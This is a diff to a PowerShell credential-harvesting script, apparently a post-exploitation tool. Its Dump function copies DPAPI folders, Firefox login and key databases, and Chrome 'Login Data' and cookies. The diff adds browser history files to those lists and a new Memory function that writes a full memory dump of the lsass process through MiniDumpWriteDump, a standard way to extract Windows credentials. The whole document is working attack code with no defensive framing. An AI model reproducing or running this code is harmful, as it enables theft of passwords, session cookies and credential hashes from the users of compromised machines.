@@ -132,6 +132,9 @@ function Dump
 
 	######################################### User softwares #########################################
 
+	##################### Memory Dump ####################
+	Memory($Out)
+
 	##################### DPAPI ####################
 
 	$dpapi_roaming = @{
@@ -163,7 +166,8 @@ function Dump
 							'key3.db',
 							'logins.json',
 							'cert8.db',
-							'cookies.sqlite'
+							'cookies.sqlite',
+							'places.sqlite'
 						)
 	}
 
@@ -172,7 +176,8 @@ function Dump
 			'paths'	= @('C:\Users\[USER]\AppData\Local\Google\Chrome\User Data')
 			'files' = @(
 							'Login Data',
-							'Cookies'
+							'Cookies',
+							'History'
 						)
 	}
 
@@ -388,3 +393,55 @@ function Dump
 
 	"Folder " + $Out + " created successfully !"
 }	
+
+function Memory($path)
+{
+			  
+			  
+		$Process = Get-Process lsass
+		$DumpFilePath = $path
+		
+		$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
+		$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
+		$Flags = [Reflection.BindingFlags] 'NonPublic, Static'
+		$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
+		$MiniDumpWithFullMemory = [UInt32] 2
+	
+			
+			  #
+		$ProcessId = $Process.Id
+		$ProcessName = $Process.Name
+		$ProcessHandle = $Process.Handle
+		$ProcessFileName = "$($ProcessName).dmp"
+		
+		$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName
+		
+		$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)
+			  
+		$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
+													$ProcessId,
+													$FileStream.SafeFileHandle,
+													$MiniDumpWithFullMemory,
+													[IntPtr]::Zero,
+													[IntPtr]::Zero,
+													[IntPtr]::Zero))
+			  
+		$FileStream.Close()
+		
+		if (-not $Result)
+		{
+			$Exception = New-Object ComponentModel.Win32Exception
+			$ExceptionMessage = "$($Exception.Message) ($($ProcessName):$($ProcessId))"
+			
+			# Remove any partially written dump files. For example, a partial dump will be written
+			# in the case when 32-bit PowerShell tries to dump a 64-bit process.
+			Remove-Item $ProcessDumpPath -ErrorAction SilentlyContinue
+			
+			throw $ExceptionMessage
+		}
+		else
+		{
+			"Mem Dump complete!"
+		}
+	
+}
